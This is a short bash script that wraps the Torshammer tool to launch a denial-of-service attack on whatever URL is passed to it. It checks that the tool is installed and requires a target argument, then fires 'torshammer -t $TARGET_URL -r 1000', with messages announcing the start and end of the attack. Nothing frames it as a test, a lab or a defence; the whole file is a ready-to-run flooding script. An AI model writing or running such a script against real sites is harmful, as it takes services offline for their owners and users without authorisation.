#!/bin/bash
# Torshammer - Denial of Service Attack
# Options:
# -t : Target URL
# -r : Number of requests

# Usage: torshammer.sh <target_url>
# Example script
# torshammer.sh http://example.com

# Check if torshammer is installed
if ! command -v torshammer &> /dev/null
then
    echo "torshammer could not be found, please install it first."
    exit
fi

# Ensure URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

echo "Starting Torshammer DoS attack on $TARGET_URL"

# Perform DoS attack
torshammer -t $TARGET_URL -r 1000

echo "Torshammer DoS attack completed."
